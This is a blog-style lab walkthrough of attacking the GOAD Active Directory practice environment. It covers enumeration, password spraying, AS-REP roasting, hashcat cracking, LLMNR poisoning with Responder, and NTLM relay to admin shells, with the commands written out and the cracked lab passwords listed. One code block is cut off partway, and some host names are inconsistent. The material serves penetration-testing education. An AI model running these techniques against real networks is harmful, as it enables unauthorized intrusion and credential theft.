+++
title = "GOAD Part 1: AD Recon, Password Spraying, ASREPRoasting & LLMNR Poisoning"
date = 2024-11-14T01:29:20+03:00
tags = ["cybersecurity"]
#Decide to delete draft or change it to false in order to display post on website
+++

---

![goad_part1_1](https://github.com/user-attachments/assets/03da8b24-ab3c-4264-b6dc-2851c0840b8c)

> ### Table of Contents

- [Introduction](#introduction)
- [Network Diagram](#network-diagram)
- [Reconnaissance and Enumeration](#reconnaissance-and-enumeration)
  - [Hosts file setup](#hosts-file-setup)
  - [Domain User enumeration](#domain-user-enumeration)
  - [Domain Group enumeration](#domain-group-enumeration)
- [Valid Usernames](#valid-usernames)
  - [Password Spraying](#password-spraying)
  - [AS-REPRoasting](#as-reproasting)
- [No Valid Credentials or Usernames](#no-valid-credentials-or-usernames)
  - [LLMNR Poisoning](#llmnr-poisoning)
    - [Listen and capture hashes](#listen-and-capture-hashes)
    - [Crack with hashcat](#crack-with-hashcat)
    - [Find targets for relaying](#find-targets-for-relaying)
- [Appendix](#appendix)
  - [Valid Credentials](#valid-credentials)
  - [Valid Users](#valid-users)

## Introduction

- [Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD) is a fully functional AD lab environment, misconfigured with several AD issues designed to help understand various AD security concepts.
- In this n-part series, we will explore how we can abuse the misconfigurations. In part 1, we focus on `enumerating` the environment to find `domains, domain controllers, usernames and groups`. We further leverage this to conduct various attacks, showcasing techniques like `password spraying & ASREPRoasting`.
- We then finish off by exploring what attacks can be carried out when we have `no credentials or usernames` to work with such as the `LLMNR Poisoning and NTLM relay`.

## Network Diagram

![goad_part1_2](https://github.com/user-attachments/assets/758bc9f7-7337-45e7-8ab5-3bff783f6d5f)

## Reconnaissance and Enumeration

- From our network diagram, we are dealing with 5 different machines across 3 domains in the network.

1. `north.sevenkingdoms.local`
   - DC01 (kingslanding)
2. `sevenkingdoms.local`
   - DC02 (winterfell)
   - SRV02 (castleback)
3. `essos.local`
   - DC02 (mereen)
   - SRV03 (braavos)

- The creators of GOAD - Orange Cyberdefense - have also come up with [this](https://orange-cyberdefense.github.io/ocd-mindmaps/) mindmap that structures our AD pentesting approach. We will frequently refer to this resource when exploring the lab.

> Example1 of Active Directory Penetration Testing

![pentest_active_directory_1](https://github.com/user-attachments/assets/a2c12381-5182-487a-afb2-04d03e36b796)

> Example2 of Active Directory Penetration Testing

![pentest_active_directory_2](https://github.com/user-attachments/assets/8e8ac296-202b-4a54-be98-d3b600bc4675)

### Hosts file setup

- We can begin by mapping out all the machines in our hosts file. Using the IP information and domains given to us, we can find the `domain controllers` in the network.

```s
nslookup -type=SRV _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.11
Server:         192.168.56.11
Address:        192.168.56.11#53

_ldap._tcp.dc._msdcs.north.sevenkingdoms.local  service = 0 100 389 winterfell.north.sevenkingdoms.local.
```

```s
nslookup -type=SRV _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
Server:         192.168.56.10
Address:        192.168.56.10#53

_ldap._tcp.dc._msdcs.sevenkingdoms.local        service = 0 100 389 kingslanding.sevenkingdoms.local.
```

````s
nslookup -type=SRV _ldap._tcp.dc._msdcs.essos.local 192.168.56.12
Server:         192.168.56.12
Address:        192.168.56.12#53

_ldap._

- Our hosts file will look as shown:

```s
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.12   essos.local meereen.essos.local meereen
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
192.168.56.23   braavos.essos.local braavos
````

### Domain User enumeration

- We have several options for this. We will use `crackmapexec and enum4linux` to check for this information.

![goad_part1_3](https://github.com/user-attachments/assets/2358e58c-56c1-4f28-80b7-8b82781d9163)

```s
crackmapexec smb 192.168.56.10-23 --users
```

![goad_part1_4](https://github.com/user-attachments/assets/f37d19a8-5be3-459a-856d-d523212b6b01)

- We get some domain users from the winterfell DC (the DC allows anonymous sessions) and credentials in a user’s description.

```
| Hostname   | Username                                |
| ---------- | --------------------------------------- |
| WINTERFELL | north.sevenkingdoms.local\Guest         |
| WINTERFELL | north.sevenkingdoms.local\arya.stark    |
| WINTERFELL | north.sevenkingdoms.local\sansa.stark   |
| WINTERFELL | north.sevenkingdoms.local\brandon.stark |
| WINTERFELL | north.sevenkingdoms.local\rickon.stark  |
| WINTERFELL | north.sevenkingdoms.local\hodor         |
| WINTERFELL | north.sevenkingdoms.local\jon.snow      |
| WINTERFELL | north.sevenkingdoms.local\samwell.tarly |
| WINTERFELL | north.sevenkingdoms.local\jeor.mormont  |
| WINTERFELL | north.sevenkingdoms.local\sql_svc       |
```

- Recon is a recursive process. Upon getting valid credentials, you should rerun your user enumeration commands with credentials to see whether you get more information.

```s
crackmapexec smb ips.txt -u samwell.tarly -p Heartsbane
```

![goad_part1_5](https://github.com/user-attachments/assets/cedea679-d0b7-419d-90b4-a0ef442b96ad)

- We get more users on the domain.

![goad_part1_6](https://github.com/user-attachments/assets/1ce0139d-4084-4ccf-b4fb-078c59dd8f86)

### Domain Group enumeration

- I ran crackmapexec without creds but did don’t get an output on any domain.
- We can run either `crackmapexec` or `enum4linux` with samwell’s creds and extract some domain group information. We will only able to retrieve information on the `north` domain.

```s
enum4linux -a -U 192.168.56.11  -u samwell.tarly -p Heartsbane
```

![goad_part1_7](https://github.com/user-attachments/assets/cdcb2492-9302-4229-8e16-7c9f549fe3c5)

- We can map them out as shown:

```
| Group                       | RID  | Members                                                                                                                                                                                                                                                                                              |
| --------------------------- | ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Mormont                     | 1108 | NORTH\jeor.mormont                                                                                                                                                                                                                                                                                   |
| Night Watch                 | 1107 | NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont                                                                                                                                                                                                                                              |
| Domain Guests               | 514  | NORTH\Guest                                                                                                                                                                                                                                                                                          |
| Group Policy Creator Owners | 520  | NORTH\Administrator                                                                                                                                                                                                                                                                                  |
| Domain Computers            | 515  | NORTH\CASTELBLACK$                                                                                                                                                                                                                                                                                   |
| Stark                       | 1106 | NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow                                                                                                                                 |
| Domain Users                | 513  | NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc |
```

## Valid Usernames

- With valid usernames for the `north` domain, we can attempt a `password spray` to hunt for `valid credentials` or perform an `ASREPRoast` using the valid credentials we obtained.

![goad_part1_8](https://github.com/user-attachments/assets/7663bff7-5d78-4a4b-a343-f33533689439)

### Password Spraying

- In this attack, we aim to identify valid user credentials by attempting few `commonly used passwords`. In organizations with a fairly high number of users, there’s a chance that some are using weak passwords.
- This attack contrasts with a standard brute-force that involves attempting many passwords against a single account which we cannot launch against this environment due to the account lockout policy shown below.
- `enum4linux` scan results:

![goad_part1_9](https://github.com/user-attachments/assets/2e3cd50c-1aad-43c0-8e93-6ea07d10723b)

- We can use `crackmapexec's --no-bruteforce` parameter to achieve the password spray. I created a list of the user accounts and proceeded to use that list for the password list as well.

```s
crackmapexec smb 192.168.56.11 -u actualusers.txt -p actualusers.txt --no-bruteforce
```

![goad_part1_10](https://github.com/user-attachments/assets/fd776074-0b08-4afc-83e7-0cac91ffa914)

- We get `hodor's` credentials.

### AS-REPRoasting

- The authentication process for kerberos can be split into the following parts.

![goad_part1_11](https://github.com/user-attachments/assets/5d835d65-8d56-4663-87c2-f81f0feca7bb)

- `AS-REPRoasting` allows attackers to extract Ticket Granting Tickets (TGT) for accounts that don’t have Kerberos `pre-authentication` enabled. Attackers can request an Authentication Service Response (AS-REP) from the KDC without knowing the user’s password. This response contains credential material that can be cracked offline.
- `Pre-authentication` ensures users send encrypted requests to the KDC when authenticating to services. When disabled, users send plain text requests and receive an encrypted AS-REP, making them vulnerable to offline cracking.
- We need valid user credentials (low privileged accounts work) to identify the target accounts. Using `samwell.tarly's` creds and `impacket-GetNPUsers`, we can enumerate the users.

```s
impacket-GetNPUsers north.sevenkingdoms.local/samwell.tarly:Heartsbane -request
```

![goad_part1_12](https://github.com/user-attachments/assets/11545056-36a1-4a6f-a3a9-33ab90454ba0)

- Proceed to crack the credentials with hashcat.

```s
hashcat -m 18200 -a 0 brandon.hash /usr/share/wordlists/rockyou.txt.gz
```

![goad_part1_13](https://github.com/user-attachments/assets/ae673976-8fb4-4227-8f75-eca024df54e8)

## No Valid Credentials/Usernames

- Lastly we will look at LLMNR Poisoning. In the event that you do not find any valid credentials or usernames, this is an essential step to take.

### LLMNR Poisoning

![goad_part1_14](https://github.com/user-attachments/assets/a50dc902-2703-4b25-ae6a-e7ed0ebb5e06)

- LLMNR (Link-Local Multicast Resolution), is a protocol in Windows used to resolve NetBIOS names of computers on the same subnet when DNS resolution fails. When attempting to locate unknown resources in a network, LLMNR multicasts requests across a network to attempt to find unknown routes e.g shares.
- Attackers can trick devices to sending sensitive information by pretending to be the resource that another computer is trying to locate.

#### Listen and capture hashes

```s
sudo responder -I eth1
```

- We eventually harvest 2 user’s credentials in the network.

![goad_part1_15](https://github.com/user-attachments/assets/e123e631-0f38-41f3-b417-4144e5c50cb1)

![goad_part1_16](https://github.com/user-attachments/assets/db05a801-60f1-4e3d-90c6-d5eb6069d2bf)

#### Crack with hashcat

```s
hashcat -m 5600 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt.gz
```

- We get `robb.stark's` hash.

- `edd's` hash could not be cracked but, we can relay the hashes to machines where `SMB signing` is disabled. SMB signing prevents relay attacks by appending a digital signature on packets for integrity checks.

#### Find targets for relaying

- We can use crackmapexec to find the target where SMB signing has been disabled.

```s
crackmapexec smb 192.168.56.10-23 --gen-relay-list relay-targets.txt
```

![goad_part1_17](https://github.com/user-attachments/assets/b3f30989-8e8e-421b-a756-3360632a0937)

- Castleback and Braavos domain controllers are vulnerable. For the attack to work, the user whose hashes being relayed has to be a local admin on the target.
- Disable SMB and HTTP Servers on responder to allow ntlmrelayx to relay the hashes instead of authenticating to itself. In Kali, the path is in the following folder.

```s
vi /etc/responder/Responder.conf
```

![goad_part1_18](https://github.com/user-attachments/assets/7dd00f45-b5f7-453c-ac7c-b6849bbdefcf)

- Start ntlmrelayx

```s
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
```

![goad_part1_19](https://github.com/user-attachments/assets/b50fcbab-b8bc-46aa-9ced-6bd578437dc7)

- Start responder as well.

```s
sudo responder -I eth1
```

- After a while we see this output where `eddard.stark` is able to authenticate to the `mereen` and `braavos` server.

![goad_part1_20](https://github.com/user-attachments/assets/362213ff-b039-4261-b69b-20cf2b4888ad)

- If we type the command `socks`, we can also see the admin status of our connection to the machines.

![goad_part1_21](https://github.com/user-attachments/assets/4fb90968-3ac1-43b8-956b-59d21cf153ee)

- We can authenticate as edd on the `192.168.56.22` machine `castleback` using `impacket-smbexec`. We can see edd.stark is a domain admin on the north domain.

```s
proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

![goad_part1_22](https://github.com/user-attachments/assets/8450cd49-0fd6-4237-9597-ec07d1b36fa0)

- In part 2, we will work with Bloodhound and see how to hunt for various misconfigurations with our access in the domains.

## Appendix

### Valid Credentials

```
| Username      | Password       |
| ------------- | -------------- |
| samwell.tarly | Heartsbane     |
| hodor         | hodor          |
| brandon.stark | iseedeadpeople |
| robb.stark    | sexywolfy      |
```

### Valid Users

```
| Group                       | RID  | Members                                                                                                                                                                                                                                                                                              |
| --------------------------- | ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Mormont                     | 1108 | NORTH\jeor.mormont                                                                                                                                                                                                                                                                                   |
| Night Watch                 | 1107 | NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont                                                                                                                                                                                                                                              |
| Domain Guests               | 514  | NORTH\Guest                                                                                                                                                                                                                                                                                          |
| Group Policy Creator Owners | 520  | NORTH\Administrator                                                                                                                                                                                                                                                                                  |
| Domain Computers            | 515  | NORTH\CASTELBLACK$                                                                                                                                                                                                                                                                                   |
| Stark                       | 1106 | NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow                                                                                                                                 |
| Domain Users                | 513  | NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc |
```
